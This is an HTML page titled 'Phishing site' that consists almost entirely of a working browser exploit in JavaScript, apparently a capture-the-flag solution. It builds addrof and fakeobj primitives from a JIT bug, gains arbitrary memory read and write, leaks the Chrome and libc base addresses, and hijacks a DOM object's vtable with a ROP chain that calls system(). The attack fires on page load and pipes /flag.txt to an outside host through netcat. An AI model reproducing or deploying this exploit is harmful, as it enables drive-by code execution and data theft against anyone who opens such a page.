<html>
<meta http-equiv="cache-control" content="no-cache" />
<title>Phishing site</title>
<script>
let ITER = 0x200;

let pup = new ArrayBuffer(8);
let i8 = new Uint8Array(pup);
let i32 = new Uint32Array(pup);
let i64 = new BigInt64Array(pup);
let f64 = new Float64Array(pup);

let d2i = (dbl) => {
  f64[0] = dbl;
  return i64[0];
};

let i2d = (num) => {
  i64[0] = BigInt(num);
  return f64[0];
};

let get32 = (dbl) => {
  f64[0] = dbl;
  return i32[0];
};

let tof64 = (n1, n2) => {
  i32[0] = n1;
  i32[1] = n2;
  return f64[0];
};

let trunc = (bi) => {
  i64[0] = bi;
  return i32[0];
};

let u64 = (buf) => {
  let result = 0n;
  for(var i = 7; i >= 0; i--) {
    result <<= 8n;
    result += BigInt(buf[i]);
  }
  return result;
};

let p64 = (value) => {
  let result = new Uint8Array(0x8);
  for(var i = 0; i < 8; i++) {
    result[i] = Number(value & 0xffn);
    value >>= 8n;
  }
  return result;
};

let print = console.log;

function addrof(obj) {
  let f = eval(` (cb) => {
    for(var i = 0; i < 200000; i++) { }
    let v = [1.1];
    let o = [v];
    cb(o);
    return v[0];
  }`);

  for(var i = 0; i < 10; i++) {
    f((o) => {});
  }
  return f((o) => { o[0][0] = obj; });
}

function fakeobj(val) {
  let f = eval(`(x, y, z, val) => {
    for(var i = 0; i < 200000; i++) { }
    let v = [1.1, 2.2, 3.3, 4.4];
    let o = [v];
    x(o);
    v[0] = 5.5;   // cow?
    y(o);
    v[0] = val;
    return z(o);
  }`);

  for(var i = 0; i < 10; i++) {
    f((o) => {}, (o) => {}, (o) => {}, val);
  }
  return f((o) => {}, (o) => { o[0][0] = {}; }, (o) => { return o[0][0]; }, val);
}

let cmd = "cat /flag.txt | nc shiki7.me 9999";

function pwn() {
  let buf = new Uint8Array(0x1000);

  for(let i = 0; i < cmd.length; i++) {
    buf[0x800 + i] = cmd.charCodeAt(i);
  }

  let defrag = new Array(ITER);
  for(let i = 0; i < ITER / 2; i++) {
    defrag[2 * i] = [i, 1.2, 2.3, 3.4, 4.5, 5.6];
    defrag[2 * i + 1] = new Float64Array(5);
  }
 
  // fake map object
  let fake_map = defrag[ITER / 2];
  fake_map[0] = tof64(0x12345, 0x19040404);
  fake_map[1] = tof64(0x21000423, 0x0a0007ff);
  
  // fake array object
  let fake_array = defrag[(ITER / 2) + 0x10];

  let proto = addrof(Array.prototype);
  print("proto = " + get32(proto).toString(16));

  fake_map[2] = tof64(get32(proto), 0);
  let fake_map_addr = get32(addrof(fake_map));
  print("fake_map_addr = " + fake_map_addr.toString(16));
  let fake_array_addr = get32(addrof(fake_array));
  print("fake_array_addr = " + fake_array_addr.toString(16));

  fake_array[0] = tof64(fake_map_addr - 0x30, 0x41414141);
  fake_array[1] = tof64(fake_array_addr, 0x80000);

  // !!! From now on, GC, and we die.
  let farr = fakeobj(tof64(fake_array_addr - 0x30, 0));
  let heap_ptr = d2i(farr[20]) - 7n;
  let heap_off = d2i(farr[21]);
  farr[19] = i2d(0x1000);
  farr[18] = i2d(0x1000);
  
  let hacked = defrag[(ITER / 2) + 0x11];
  // !!! Critical section ended.

  print("heap_ptr = " + heap_ptr.toString(16));

	let rw = {
    addrof: function(obj) {
      return heap_ptr + BigInt(get32(addrof(obj))) - 1n;
    },
    setaddr: function(addr) {
      farr[20] = i2d(addr);
      farr[21] = i2d(0n);
    },
    read8: function(addr) {
      this.setaddr(addr);
      return d2i(hacked[0]);
    },
    write8: function(addr,val) {
      this.setaddr(addr);
      hacked[0] = i2d(val);
    },
    readptr: function(addr) {
      return heap_ptr + BigInt(trunc(this.read8(addr))) - 1n;
    },
  };

  let Array_addr = rw.addrof(Array);
  console.log("Array addr = " + Array_addr.toString(16));
  let Array_builtin_addr = rw.readptr(Array_addr + 0x18n);
  console.log("Array builtin addr = " + Array_builtin_addr.toString(16));
  let Array_builtins_addr = rw.read8(Array_builtin_addr + 0x42n);
  console.log("Array_builtins_addr = " + Array_builtins_addr.toString(16));  
  let chrome_base = Array_builtins_addr - 0x510b620n;
  console.log("chrome_base = " + chrome_base.toString(16));
  let gadget = chrome_base + 0x872bd7en;
  let cxa_finalize = rw.read8(chrome_base + 0xACD2A10n);
  let libc_base = cxa_finalize - 0x00000000000435d0n;
  let system = libc_base + 0x4f4e0n;
  let poprdi = libc_base + 0x000000000002155fn;
  console.log("libc_base = " + libc_base.toString(16));

  let div = document.createElement("div");
  let div_addr = rw.addrof(div);  // wrapper
  console.log("div addr = " + div_addr.toString(16));
  let divobj_addr = rw.read8(div_addr + 20n);
  console.log("divobj addr = " + divobj_addr.toString(16));
  let buf_ptr = rw.read8(rw.addrof(buf) + 40n);
  console.log("Buffer addr = " + buf_ptr.toString(16));
  let vtbl_ptr = rw.read8(divobj_addr);
  console.log("Vtable addr = " + vtbl_ptr.toString(16));

  rw.write8(buf_ptr + 0x100n, poprdi);
  rw.write8(buf_ptr + 0x108n, buf_ptr + 0x800n);  // cmd
  rw.write8(buf_ptr + 0x110n, system);
  rw.write8(buf_ptr + 0x100n + 0x50n, gadget);  // stack pivot

  rw.write8(divobj_addr, buf_ptr + 0x100n);
  div.dispatchEvent(new Event('click'));
  
  while(true) {};
}
</script>
<body onload="pwn()">
Don't get mad, get even.
</body>
</html>
